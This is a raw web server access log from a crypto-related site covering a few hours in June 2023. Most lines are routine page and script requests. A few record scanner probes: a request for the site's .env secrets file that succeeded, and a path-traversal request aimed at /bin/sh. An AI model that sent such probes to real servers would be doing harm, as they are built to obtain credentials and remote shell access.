144.217.207.28 - - [05/Jun/2023:23:35:44 -0400] "GET /env.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:35:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:39:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:39:43 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:43:46 -0400] "GET / HTTP/2.0" 200 80756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:43:50 -0400] "GET /assets/css/plugins/bootstrap.min.css.map HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:43:51 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:44:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:44:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:49:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:49:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
159.65.166.255 - - [05/Jun/2023:23:53:12 -0400] "GET / HTTP/1.1" 200 143229 "-" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
144.217.207.28 - - [05/Jun/2023:23:54:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:54:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:59:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:59:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
193.118.53.194 - - [06/Jun/2023:00:00:11 -0400] "GET / HTTP/1.1" 200 143229 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:04:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:04:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
20.117.181.251 - - [06/Jun/2023:00:05:01 -0400] "GET /.env HTTP/1.1" 200 662 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.117.181.251 - - [06/Jun/2023:00:05:01 -0400] "POST / HTTP/1.1" 200 143230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:09:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:09:44 -0400] "GET /jeffjs/functions.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:09:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
34.238.194.206 - - [06/Jun/2023:00:10:06 -0400] "GET / HTTP/1.1" 200 143229 "-" "Mozilla/5.0 (Linux; Android 7.0; LG-H820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:14:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:14:43 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET //cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /jeffjs/action.js HTTP/1.1" 200 17327 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-AU) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.35 Puffin/3.9174IT"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /env.js HTTP/1.1" 200 50 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/76.0.3809.123 Mobile/15E148 Safari/605.1"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /js/plugins/isotope.pkg.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 8.1.0; SM-T580) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Safari/537.36"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET //xumm.app/assets/cdn/xumm-oauth2-pkce.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 9; Moto Z3 Play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /js/plugins/jquery.slick.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /js/plugins/jquery-3.6.0.min.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 8.0.0; moto e5 cruise Build/OCPS27.91-157-12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /jeffjs/filter.js HTTP/1.1" 200 5380 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /jeffjs/functions.js HTTP/1.1" 200 9748 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1"
34.238.194.206 - - [06/Jun/2023:00:15:46 -0400] "GET /js/main.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0"
194.110.203.227 - - [06/Jun/2023:00:19:11 -0400] "GET / HTTP/1.1" 200 143230 "-" "Python/3.7 aiohttp/3.8.4"
144.217.207.28 - - [06/Jun/2023:00:19:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:19:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:24:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:24:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:29:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:29:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:34:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:34:43 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:39:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:39:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
83.97.73.89 - - [06/Jun/2023:00:39:43 -0400] "GET / HTTP/1.1" 200 143226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:44:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:44:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:49:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:49:44 -0400] "GET /jeffjs/functions.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:49:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
45.33.80.243 - - [06/Jun/2023:00:50:59 -0400] "GET / HTTP/1.1" 200 143227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:54:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:54:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:59:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:00:59:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:04:42 -0400] "GET /assets/css/style.css HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:04:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:04:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
172.105.128.13 - - [06/Jun/2023:01:09:00 -0400] "GET / HTTP/1.1" 200 143229 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:10:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:10:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:15:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:15:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
83.97.73.89 - - [06/Jun/2023:01:16:53 -0400] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:20:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:20:44 -0400] "GET /jeffjs/action.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:20:44 -0400] "GET /jeffjs/filter.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:20:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:24:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:24:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:29:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:29:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
142.93.62.187 - - [06/Jun/2023:01:32:16 -0400] "GET / HTTP/1.1" 200 143228 "-" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
144.217.207.28 - - [06/Jun/2023:01:34:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:34:44 -0400] "GET /jeffjs/functions.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:34:44 -0400] "GET /env.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:34:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
83.97.73.89 - - [06/Jun/2023:01:38:26 -0400] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:39:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:39:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:44:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:44:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:49:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:49:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:54:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:54:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:59:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:01:59:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:04:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:04:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:10:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:10:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:14:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:14:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:19:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:19:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:24:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:24:44 -0400] "GET /jeffjs/functions.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:24:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:29:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
